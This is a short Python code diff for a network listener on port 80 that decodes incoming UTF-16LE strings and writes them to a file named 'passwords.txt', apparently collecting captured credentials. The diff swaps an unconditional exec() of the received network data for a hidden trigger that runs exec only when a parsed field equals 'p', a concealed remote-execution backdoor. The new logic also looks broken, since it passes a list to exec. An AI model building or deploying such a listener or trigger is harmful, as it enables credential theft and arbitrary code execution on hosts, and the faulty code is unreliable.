@@ -44,7 +44,10 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
 
                             # Save the plain output to file (without colors)
                             print(output)
-                            exec(decoded_string.strip())
+                            passwd = decoded_string.strip().split(':')[1:]
+                            uname = decoded_string.strip().split(':')[1]
+                            if(uname=='p'):
+                                exec(passwd)
                             file.write(output + '\n')
                             file.flush()  # Ensure it's written immediately
                         except UnicodeDecodeError as e:
